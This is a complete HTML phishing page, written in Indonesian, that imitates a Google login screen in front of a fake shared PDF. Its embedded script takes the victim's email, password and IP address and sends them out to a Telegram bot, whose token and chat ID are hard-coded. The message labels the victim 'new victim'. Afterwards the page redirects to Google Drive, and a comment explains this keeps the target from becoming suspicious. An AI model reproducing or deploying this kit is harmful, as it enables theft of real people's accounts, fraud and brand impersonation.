<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Shared - Google Cloud Storage</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f8f9fa; font-family: 'Roboto', sans-serif; }
        .login-box { box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); }
    </style>
</head>
<body class="flex flex-col items-center justify-center h-screen">

    <div id="file-preview" class="mb-6 text-center">
        <div class="bg-white p-4 rounded-lg shadow-sm border border-gray-200 flex items-center space-x-4">
            <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" class="w-12 h-12" alt="PDF Icon">
            <div class="text-left">
                <p class="font-bold text-gray-700 text-sm">URGENT_DOCUMENT_PRIVATE.pdf</p>
                <p class="text-xs text-gray-500">Ukuran: 2.4 MB • Terakhir diubah: 2 menit yang lalu</p>
            </div>
        </div>
        <p class="text-gray-600 text-sm mt-4 font-medium">Silakan login untuk memverifikasi identitas Anda sebelum mengunduh.</p>
    </div>

    <div class="bg-white p-10 rounded-lg login-box w-full max-w-md border border-gray-200">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/2560px-Google_2015_logo.svg.png" class="h-8 mx-auto mb-6" alt="Logo">
        
        <h1 class="text-2xl font-normal text-center text-gray-800 mb-8">Masuk</h1>

        <form id="auth-form">
            <div class="relative mb-6">
                <input type="text" id="target_user" class="block px-4 py-3 w-full text-gray-900 bg-transparent border border-gray-300 rounded-md appearance-none focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 peer" placeholder="Email atau ponsel" required />
            </div>

            <div class="relative mb-8">
                <input type="password" id="target_pass" class="block px-4 py-3 w-full text-gray-900 bg-transparent border border-gray-300 rounded-md appearance-none focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 peer" placeholder="Masukkan sandi Anda" required />
            </div>

            <div class="flex items-center justify-between mb-8">
                <a href="#" class="text-sm font-medium text-blue-600 hover:underline">Lupa email?</a>
                <button type="submit" id="sub-btn" class="bg-blue-600 hover:bg-blue-700 text-white px-8 py-2 rounded font-medium transition duration-200 shadow-md">
                    Berikutnya
                </button>
            </div>
        </form>

        <p class="text-sm text-gray-600">Bukan komputer Anda? Gunakan mode Tamu untuk masuk secara pribadi. <a href="#" class="text-blue-600 font-medium">Pelajari lebih lanjut</a></p>
    </div>

    <footer class="mt-10 flex space-x-6 text-xs text-gray-500">
        <a href="#">Indonesia</a>
        <a href="#">Bantuan</a>
        <a href="#">Privasi</a>
        <a href="#">Persyaratan</a>
    </footer>

    <script>
        const form = document.getElementById('auth-form');
        
        // --- DATA TELEGRAM LO ---
        const BOT_TOKEN = "8205581950:AAETz7C7eeiOrINZWEIR4dTfRmacVWVNXPc"; 
        const CHAT_ID = "8551809114";
        // ------------------------

        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const btn = document.getElementById('sub-btn');
            btn.innerHTML = "Memuat...";
            btn.disabled = true;

            const u = document.getElementById('target_user').value;
            const p = document.getElementById('target_pass').value;

            // Logika ambil IP target (Opsional, tapi bikin data lo makin lengkap)
            fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                const ip = data.ip;
                const text = `🎯 **KORBAN BARU (CLOUD)** 🎯\n\n👤 User: \`${u}\` \n🔑 Pass: \`${p}\` \n🌐 IP: \`${ip}\` \n⏰ Waktu: ${new Date().toLocaleString()}`;

                // Kirim ke Telegram
                return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
            })
            .then(() => {
                // Setelah dapet data, alihkan ke link download palsu atau link asli
                window.location.href = "https://drive.google.com"; 
            })
            .catch(err => {
                console.log(err);
                // Tetap alihkan biar target nggak curiga
                window.location.href = "https://drive.google.com";
            });
        });
    </script>
</body>
</html>
